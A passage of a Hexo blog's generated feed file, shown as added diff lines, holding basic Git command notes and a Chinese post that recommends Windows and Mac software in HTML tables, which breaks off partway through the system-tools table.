+<h2 id="git-add-lt-file-gt"><a href="#git-add-lt-file-gt" class="headerlink" title="git add &lt;file&gt;"></a>git add <code>&lt;file&gt;</code></h2><p>Add files to the staging area.</p>
+<h3 id="Staging-Area"><a href="#Staging-Area" class="headerlink" title="Staging Area"></a>Staging Area</h3><ul>
+<li>A place where we can group files together before we “commit” them to Git.<br>Commit</li>
+</ul>
+<h3 id="add-all"><a href="#add-all" class="headerlink" title="add all"></a>add all</h3><ul>
+<li>You can also type <code>git add -A</code> . where the dot stands for the current directory, so everything in and beneath it is added. The <code>-A</code> ensures even file deletions are included.</li>
+</ul>
+<h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><p>You can use <code>git reset &lt;filename&gt;</code> to remove a file or files from the staging area.</p>
+<h2 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h2><p>A “commit” is a snapshot of our repository. This way if we ever need to look back at the changes we’ve made (or if someone else does), we will see a nice timeline of all changes.</p>
+<h3 id="git-commit-m-“msg”"><a href="#git-commit-m-“msg”" class="headerlink" title="git commit -m “msg”"></a>git commit -m “msg”</h3><ul>
+<li>To store our staged changes we run the commit command with a message describing what we’ve changed. </li>
+</ul>
+<h3 id="‘-a’-option"><a href="#‘-a’-option" class="headerlink" title="‘-a’ option"></a>‘-a’ option</h3><ul>
+<li>Auto removes deleted files with the commit.</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit -am &quot;msg&quot;</div></pre></td></tr></table></figure>
+<h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><p>a journal that remembers all the changes we’ve committed so far</p>
+<h3 id="git-log-–summary"><a href="#git-log-–summary" class="headerlink" title="git log –summary"></a>git log –summary</h3><ul>
+<li>see more information for each commit. You can see where new files were added for the first time or where files were deleted. It’s a good overview of what’s going on in the project.</li>
+</ul>
+<h2 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git remote add &lt;remote name&gt; &lt;repository URL&gt;</div><div class="line">git remote add origin https://github.com/try-git/try_git.git</div></pre></td></tr></table></figure>
+<p>Git doesn’t care what you name your remotes, but it’s typical to name your main one <code>origin</code>.</p>
+<p>It’s also a good idea for your main repository to be on a remote server like GitHub in case your machine is lost at sea during a transatlantic boat cruise or crushed by three monkey statues during an earthquake.</p>
+<h2 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h2><p>Tells Git where to put our commits when we’re ready.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git push -u &lt;remote name&gt; &lt;branch name&gt;</div><div class="line">git push -u origin master</div></pre></td></tr></table></figure>
+<p>The <code>-u</code> tells Git to remember the parameters, so that next time we can simply run <code>git push</code>.</p>
+<h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><p>Sometimes when you go to pull you may have changes you don’t want to commit just yet. One option you have, other than commiting, is to stash the changes.</p>
+<p>Use the command <code>git stash</code> to stash your changes, and <code>git stash apply</code> to re-apply your changes after your pull.</p>
+<h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git push &lt;remote name&gt; &lt;branch name&gt;</div><div class="line">git pull origin master</div></pre></td></tr></table></figure>
+<p>Check for changes on remote repository and pull down any new changes.</p>
+<h2 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h2><p>A good overview of changes we have made and lets us add files or directories one at a time and commit them separately.</p>
+<h3 id="git-diff-HEAD"><a href="#git-diff-HEAD" class="headerlink" title="git diff HEAD"></a>git diff HEAD</h3><ul>
+<li>Show what is different from our last commit. <code>HEAD</code> points to your most recent commit by default.</li>
+</ul>
+<h3 id="git-diff-–staged"><a href="#git-diff-–staged" class="headerlink" title="git diff –staged"></a>git diff –staged</h3><ul>
+<li>Look at changes within files that have already been staged.</li>
+</ul>
+<h2 id="git-checkout-–-lt-target-gt"><a href="#git-checkout-–-lt-target-gt" class="headerlink" title="git checkout – &lt;target&gt;"></a>git checkout – <code>&lt;target&gt;</code></h2><p>Changed files back to how they were at the last commit, namely get rid of all the changes since the last commit.</p>
+<p><code>--</code>: promise the command line that there are no more options after the ‘–’, avoid switching to the branch of the same name.</p>
+<h2 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h2><p>List local branches of now repository.</p>
+<h3 id="git-branch-lt-name-gt"><a href="#git-branch-lt-name-gt" class="headerlink" title="git branch &lt;name&gt;"></a>git branch <code>&lt;name&gt;</code></h3><ul>
+<li>Create a new branch.</li>
+</ul>
+<blockquote>
+<p>When developers are working on a feature or bug they’ll often create a copy (aka. branch) of their code they can make separate commits to. Then when they’re done they can merge this branch back into their main master branch.</p>
+</blockquote>
+<h3 id="git-checkout-lt-branch-gt"><a href="#git-checkout-lt-branch-gt" class="headerlink" title="git checkout &lt;branch&gt;"></a>git checkout <code>&lt;branch&gt;</code></h3><ul>
+<li>Switch to certain branch.</li>
+</ul>
+<h3 id="git-checkout-b-new-branch"><a href="#git-checkout-b-new-branch" class="headerlink" title="git checkout -b new_branch"></a>git checkout -b new_branch</h3><ul>
+<li>Checkout and create a branch at the same time. </li>
+</ul>
+<h2 id="git-rm-lt-file-gt"><a href="#git-rm-lt-file-gt" class="headerlink" title="git rm &lt;file&gt;"></a>git rm <code>&lt;file&gt;</code></h2><p>Not only remove the actual files from disk, but will also stage the removal of the files for us.</p>
+<h3 id="git-rm-r-folder"><a href="#git-rm-r-folder" class="headerlink" title="git rm -r folder"></a>git rm -r folder</h3><ul>
+<li>Recursively remove all folders and files from the given directory.</li>
+</ul>
+<h2 id="git-merge-lt-branch-gt"><a href="#git-merge-lt-branch-gt" class="headerlink" title="git merge &lt;branch&gt;"></a>git merge <code>&lt;branch&gt;</code></h2><p>Merge your changes from the given branch into current branch.</p>
+<h3 id="Merge-Conflicts"><a href="#Merge-Conflicts" class="headerlink" title="Merge Conflicts"></a>Merge Conflicts</h3><ul>
+<li>Merge Conflicts can occur when changes are made to a file at the same time. Reading more on <a href="http://git-scm.com/docs/git-merge#_how_conflicts_are_presented" target="_blank" rel="external">how conflicts are presented</a>.</li>
+</ul>
+<h2 id="Delete-Branch"><a href="#Delete-Branch" class="headerlink" title="Delete Branch"></a>Delete Branch</h2><h3 id="git-branch-d-lt-branch-gt"><a href="#git-branch-d-lt-branch-gt" class="headerlink" title="git branch -d &lt;branch&gt;"></a>git branch -d <code>&lt;branch&gt;</code></h3><ul>
+<li>Delete a local branch. <code>-d</code> won’t let you delete something that hasn’t been merged.</li>
+</ul>
+<h3 id="f-and-D"><a href="#f-and-D" class="headerlink" title="-f and -D"></a><code>-f</code> and <code>-D</code></h3><ul>
+<li>Force delete the branch that hasn’t been merged. </li>
+</ul>
+<blockquote>
+<p>Add the <code>-f</code>(–force) option or use <code>-D</code> which combines <code>-d -f</code> together into one command.</p>
+</blockquote>
+<h3 id="Delete-Remote-Branch"><a href="#Delete-Remote-Branch" class="headerlink" title="Delete Remote Branch"></a>Delete Remote Branch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git branch -r -d &lt;remote name&gt;/&lt;branch name&gt;</div><div class="line">git push &lt;remote name&gt;: &lt;branch name&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git branch -r -d origin/branch-name</div><div class="line">git push origin :branch-name</div></pre></td></tr></table></figure>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 程序猿指令应用 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Git </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[自用 Windows 和 Mac 软件推荐]]></title>
+      <url>http://yikunhaocong.xyz/2015/09/20/windows-mac-software/</url>
+      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>罗列自己正在使用的 Windows 和 Mac OS 软件，基本上都是同类中能较好满足个人需求的软件，作表记录，方便自己检索，也顺便推荐给大家。<p></p>
+<h3 id="软件分类说明"><a href="#软件分类说明" class="headerlink" title="软件分类说明"></a>软件分类说明</h3><ul>
+<li><strong>编程开发:</strong> 目前写代码用到的一些软件；</li>
+<li><strong>网络应用:</strong> 依赖于网络运行的软件，比如浏览器，聊天软件，下载工具等；</li>
+<li><strong>文档处理:</strong> 查看和处理 Word, Excel, PDF 等文档；</li>
+<li><strong>影音图像:</strong> 查看和处理多媒体文件，比如看图，听歌，视频处理等；</li>
+<li><strong>系统工具:</strong> 增强、个性化系统或者系统自带软件的功能，比如资源管理器增强，任务栏个性化等；</li>
+<li><strong>应用软件:</strong> 不属于以上分类的软件；</li>
+</ul>
+<a id="more"></a>
+<h3 id="表格内容解释"><a href="#表格内容解释" class="headerlink" title="表格内容解释"></a>表格内容解释</h3><ul>
+<li>表格依次列出软件名字，开发商，系统，付费，备注，默认使用软件的最新版本。</li>
+<li><strong>表头英文:</strong> 用不留空的英文单词表示，避免默认设置下表头被换行；</li>
+<li><strong>系统栏打 √ :</strong> 主要在该系统下使用该软件，少数双系统下都频繁使用；</li>
+<li><strong>系统栏标 — :</strong> 该软件不支持该系统；</li>
+<li><strong>Free 免费栏 :</strong> 标 x 该软件为付费共享软件；标 — 表示提供免费版，但功能等有所限制。</li>
+<li><strong>链接:</strong> 点击软件名字跳转到软件主页，点开发商跳转到对其介绍页面或者对应官网。</li>
+<li><strong>Note 备注:</strong> 软件用途简单介绍</li>
+</ul>
+<h2 id="编程开发"><a href="#编程开发" class="headerlink" title="编程开发"></a>编程开发</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>SoftwareName</th>
+<th>　　Developer　　</th>
+<th style="text-align:center">Mac</th>
+<th style="text-align:center">Win</th>
+<th style="text-align:center">Free</th>
+<th>　　　　Note　　　　</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><a href="https://desktop.github.com/" target="_blank" rel="external">GitHub Desktop</a></td>
+<td><a href="https://en.wikipedia.org/wiki/GitHub" target="_blank" rel="external">GitHub, Inc.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>GitHub 桌面版</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><a href="http://www.sublimetext.com/" target="_blank" rel="external">Sublime Text 3</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Sublime_Text" target="_blank" rel="external">Jon Skinner</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>代码编辑器</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><a href="http://brackets.io/" target="_blank" rel="external">Brackets</a></td>
+<td><a href="http://is.gd/q5bGeJ" target="_blank" rel="external">Adobe Systems</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>Web 代码编辑器</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><a href="https://kapeli.com/dash" target="_blank" rel="external">Dash</a></td>
+<td><a href="https://kapeli.com/" target="_blank" rel="external">Kapeli</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>API Snippet 代码管理</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><a href="http://www.theescapers.com/flux/" target="_blank" rel="external">Flux V</a></td>
+<td><a href="http://www.theescapers.com/" target="_blank" rel="external">Escapers Ltd.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>可视化网页开发</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><a href="https://www.apachefriends.org/zh_cn/index.html" target="_blank" rel="external">XAMPP</a></td>
+<td><a href="https://www.apachefriends.org" target="_blank" rel="external">Apache Friends</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>PHP 开发环境，本地 WordPress</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><a href="http://www.git-scm.com/" target="_blank" rel="external">Git</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Linus_Torvalds" target="_blank" rel="external">Linus Torvalds</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>Distributed version control system</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><a href="http://colorsnapper.com/" target="_blank" rel="external">ColorSnapper</a></td>
+<td><a href="http://colorsnapper.com/" target="_blank" rel="external">Koolesache</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>屏幕取色器</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td><a href="https://nodejs.org/en/" target="_blank" rel="external">Node.js</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Node.js" target="_blank" rel="external">Joyent, Inc.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>JavaScript runtime</td>
+</tr>
+</tbody>
+</table>
+<h2 id="网络应用"><a href="#网络应用" class="headerlink" title="网络应用"></a>网络应用</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>SoftwareName</th>
+<th>　　Developer　　</th>
+<th style="text-align:center">Mac</th>
+<th style="text-align:center">Win</th>
+<th style="text-align:center">Free</th>
+<th>　　　　Note　　　　</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><a href="http://www.google.com/chrome/" target="_blank" rel="external">Chrome</a></td>
+<td><a href="http://baike.baidu.com/view/105.htm" target="_blank" rel="external">谷歌</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>主力浏览器，插件脚本扩展</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><a href="http://im.qq.com/" target="_blank" rel="external">QQ</a></td>
+<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>万年隐身</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><a href="http://shadowsocks.org/en/index.html" target="_blank" rel="external">ShadowsocksX</a></td>
+<td><a href="https://github.com/clowwindy" target="_blank" rel="external">clowwindy</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>和FQ谐</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><a href="http://mac.xunlei.com/app/" target="_blank" rel="external">Thunder Store</a></td>
+<td><a href="http://baike.baidu.com/view/467578.htm" target="_blank" rel="external">迅雷网络</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>检查应用更新</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><a href="http://wangwang.taobao.com/" target="_blank" rel="external">阿里旺旺</a></td>
+<td><a href="http://baike.baidu.com/view/1247049.htm" target="_blank" rel="external">阿里巴巴集团</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>买买买</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><a href="https://jianguoyun.com/" target="_blank" rel="external">坚果云</a></td>
+<td><a href="http://baike.baidu.com/view/8051910.htm" target="_blank" rel="external">上海亦存网络</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>文档同步，备用</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><a href="http://dl.xunlei.com/" target="_blank" rel="external">迅雷</a></td>
+<td><a href="http://baike.baidu.com/view/467578.htm" target="_blank" rel="external">迅雷网络</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>极速版，离线下载和高速通道</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><a href="http://www.flvcd.com/index.htm" target="_blank" rel="external">FLVCD 硕鼠</a></td>
+<td></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>网络视频下载</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td><a href="http://weixin.qq.com/" target="_blank" rel="external">微信</a></td>
+<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>聊胜于无</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td><a href="http://www.maxthon.cn/" target="_blank" rel="external">Maxthon 傲游</a></td>
+<td><a href="http://www.maxthon.cn/company/" target="_blank" rel="external">傲游天下</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>备用</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td><a href="http://pan.baidu.com/disk/download/guanjia/" target="_blank" rel="external">百度云管家</a></td>
+<td><a href="http://baike.baidu.com/view/262.htm" target="_blank" rel="external">百度</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>搜集、分享资源</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td><a href="http://www.ad-safe.com/" target="_blank" rel="external">ADSafe 净网大师</a></td>
+<td><a href="http://www.ad-safe.com/" target="_blank" rel="external">大摩网络</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>网页、视频广告屏蔽</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td><a href="http://music.163.com/#/download" target="_blank" rel="external">网易云音乐</a></td>
+<td><a href="http://baike.baidu.com/view/149363.htm" target="_blank" rel="external">网易公司</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">—</td>
+<td>看评论听歌，发现好歌</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td><a href="http://yunpan.360.cn/" target="_blank" rel="external">360云盘</a></td>
+<td><a href="http://baike.baidu.com/view/1458023.htm" target="_blank" rel="external">奇虎360</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">—</td>
+<td>主力同步软件，容量足够，带历史版本，文件数量不限</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td><a href="www.teamviewer.com">TeamViewer</a></td>
+<td><a href="https://en.wikipedia.org/wiki/TeamViewer" target="_blank" rel="external">TeamViewer GmbH</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>远程桌面控制</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td><a href="http://reederapp.com/mac/" target="_blank" rel="external">Reeder 3</a></td>
+<td><a href="https://itunes.apple.com/us/app/reeder-3/id880001334?ls=1&amp;mt=12" target="_blank" rel="external">Silvio Rizzi</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>RSS 订阅</td>
+</tr>
+</tbody>
+</table>
+<h2 id="文档处理"><a href="#文档处理" class="headerlink" title="文档处理"></a>文档处理</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>SoftwareName</th>
+<th>　　Developer　　</th>
+<th style="text-align:center">Mac</th>
+<th style="text-align:center">Win</th>
+<th style="text-align:center">Free</th>
+<th>　　　　Note　　　　</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><a href="http://endnote.com/" target="_blank" rel="external">Endnote</a></td>
+<td><a href="https://en.wikipedia.org/wiki/EndNote" target="_blank" rel="external">Thomson Reuters</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td>Reference 文献管理</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><a href="http://is.gd/SjAbs5" target="_blank" rel="external">Office 2016</a></td>
+<td><a href="http://baike.baidu.com/view/2353.htm" target="_blank" rel="external">微软公司</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>Word , Excel, PowerPoint, OneNote</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><a href="https://www.gonitro.com/" target="_blank" rel="external">Nitro PDF Pro</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Nitro_PDF" target="_blank" rel="external">Nitro</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>PDF编辑</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><a href="https://www.yinxiang.com/" target="_blank" rel="external">印象笔记</a></td>
+<td><a href="http://baike.baidu.com/view/8548200.htm" target="_blank" rel="external">Evernote</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">—</td>
+<td>网文搜集</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><a href="http://www.calibre-ebook.com/" target="_blank" rel="external">Calibre</a></td>
+<td><a href="http://is.gd/V4FSaf" target="_blank" rel="external">Kovid Goyal</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>电子书管理</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><a href="http://25.io/mou/" target="_blank" rel="external">Mou</a></td>
+<td><a href="http://25.io" target="_blank" rel="external">25.io Inc</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>Markdown 编辑器</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><a href="http://sigil-ebook.com/" target="_blank" rel="external">Sigil</a></td>
+<td><a href="http://is.gd/bDKF8D" target="_blank" rel="external">John Schember</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>epub 电子书制作</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><a href="www.xmind.net">XMind</a></td>
+<td><a href="https://en.wikipedia.org/wiki/XMind" target="_blank" rel="external">XMind Ltd.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">x</td>
+<td>思维导图制作</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td><a href="https://www.mythicsoft.com/filelocatorpro" target="_blank" rel="external">FileLocator</a></td>
+<td><a href="https://www.mythicsoft.com/info/aboutus" target="_blank" rel="external">Mythicsoft Ltd.</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>全文检索工具 支持正则表达式</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td><a href="http://www.foxitsoftware.cn/products/reader/" target="_blank" rel="external">福昕阅读器</a></td>
+<td><a href="http://www.foxitsoftware.cn/company/" target="_blank" rel="external">福昕软件</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>PDF 阅读器</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td><a href="http://www.voidtools.com/" target="_blank" rel="external">Everything</a></td>
+<td><a href="http://is.gd/avswMs" target="_blank" rel="external">David Carpenter</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>文件名搜索</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td><a href="https://code.google.com/p/psp-comic-helper/" target="_blank" rel="external">PSP Comic Helper</a></td>
+<td>鱼蛋</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>漫画分割转换</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td><a href="http://23192069.qzone.qq.com/2" target="_blank" rel="external">字幕转换助手</a></td>
+<td><a href="http://user.qzone.qq.com/23192069" target="_blank" rel="external">poseidon</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>多格式字幕互转</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td><a href="https://code.google.com/p/pdfbinder/" target="_blank" rel="external">PDFBinder</a></td>
+<td></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>PDF 合并工具</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td><a href="http://pan.baidu.com/s/1o6EJuiA" target="_blank" rel="external">MoodPad</a></td>
+<td></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>追月文本处理 i254</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td><a href="http://is.gd/11CoRf" target="_blank" rel="external">拖把更名器</a></td>
+<td></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>批量重命名</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td><a href="http://kuyur.info/blog/archives/1388" target="_blank" rel="external">ANSI2Unicode</a></td>
+<td><a href="http://kuyur.info/blog/" target="_blank" rel="external">小熏</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>CUE 乱码修复，编码转换</td>
+</tr>
+<tr>
+<td style="text-align:center">18</td>
+<td><a href="http://is.gd/KgzGwF" target="_blank" rel="external">SrtEdit</a></td>
+<td>袁卫国</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>字幕编辑器</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td><a href="http://blog.csdn.net/redbirdli/article/category/182219" target="_blank" rel="external">Subindex</a></td>
+<td>火鸟</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>火鸟字幕合并</td>
+</tr>
+</tbody>
+</table>
+<h2 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>SoftwareName</th>
+<th>Developer</th>
+<th style="text-align:center">Mac</th>
+<th style="text-align:center">Win</th>
+<th style="text-align:center">Free</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><a href="http://cn.ejie.me/" target="_blank" rel="external">Clover</a></td>
+<td>易捷科技</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>多标签资源管理器</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><a href="http://www.listary.com/" target="_blank" rel="external">Listary</a></td>
+<td>Bopsoft</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">x</td>
+<td>资源管理器增强</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><a href="http://www.tcbmi.com/strokeit/" target="_blank" rel="external">StrokeIt</a></td>
+<td>Jeff Doozan</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>鼠标手势</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><a href="https://www.alfredapp.com/" target="_blank" rel="external">Alfred</a></td>
+<td>Running with Crayons</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">—</td>
+<td>搜索快捷键增强</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><a href="http://www.macbartender.com/" target="_blank" rel="external">Bartender</a></td>
+<td><a href="http://www.surteesstudios.com/about/" target="_blank" rel="external">Surtees Studios</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">—</td>
+<td>任务栏瘦身</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><a href="http://www.bettertouchtool.net/" target="_blank" rel="external">BetterTouchTool</a></td>
+<td><a href="http://blog.boastr.net/" target="_blank" rel="external">Andreas Hegenberg</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>触控板手势</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><a href="http://www.clipmenu.com/" target="_blank" rel="external">ClipMenu</a></td>
+<td><a href="http://www.naotaka.com/" target="_blank" rel="external">Naotaka Morimoto</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">—</td>
+<td>剪贴板增强</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><a href="http://www.shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock" target="_blank" rel="external">Day-O</a></td>
+<td><a href="http://www.shauninman.com/pendium/" target="_blank" rel="external">Shaun Inman</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>菜单栏日历</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
